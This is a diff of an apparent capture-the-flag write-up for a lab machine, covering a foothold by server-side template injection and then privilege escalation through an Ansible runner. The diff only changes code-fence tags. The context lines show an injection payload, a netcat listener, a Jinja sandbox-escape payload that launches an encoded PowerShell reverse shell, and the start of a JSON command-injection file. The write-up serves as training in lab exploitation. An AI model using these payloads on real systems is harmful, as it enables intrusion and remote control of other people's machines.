@@ -12,7 +12,7 @@ Context: Obtaining Foothold using Server Side Template Injection with Jinja
 
 I can see that I can by pass with this payload
 
-```html
+```
 invoice_id=&form_type=scannable_invoice&qr_link=https%3A%2F%2Fbruhaps.htb%2Fstatic%2Fqr_code%2Fqr_code_5868828307.png" {{'><script>;</script>'|safe}}
 ```
 
@@ -88,7 +88,7 @@ nc -lvnp 4444
 
 Payload used for rev shell
 
-```html
+```
 ASSS<font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell -e JABjAGwAaQBlBASE64PAYLOADAKQA=') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
                 exploit
 </font>
@@ -178,7 +178,7 @@ bash-5.1#
 
 Context: I had perms for Ansible runner.
 ### Find Ansible Hash
-```C
+```
 // Version : 1 #include <stdio.h> #include <stdlib.h> #include <string.h> #include <dirent.h> #include <openssl/md5.h> #define INVENTORY_FILE "/opt/playbooks/inventory.ini" #define PLAYBOOK_LOCATION "/opt/playbooks/" #define ANSIBLE_PLAYBOOK_BIN "/usr/bin/ansible-playbook" #define ANSIBLE_GALAXY_BIN "/usr/bin/ansible-galaxy" #define AUTH_KEY_HASH "0feda17076d793c2ef2870d7427ad4ed" int check_auth(const char* auth_key) { unsigned char digest[MD5_DIGEST_LENGTH]; MD5((const unsigned char*)auth_key, strlen(auth_key), digest); char md5_str[33]; for (int i = 0; i < 16; i++) { sprintf(&md5_str[i*2], "%02x", (unsigned int)digest[i]); }
 ```
 
@@ -195,7 +195,7 @@ HASH:RESult
 
 Create json file and insert command injection.
 
-```json
+```
 {
  "run": {
     "action": "install",
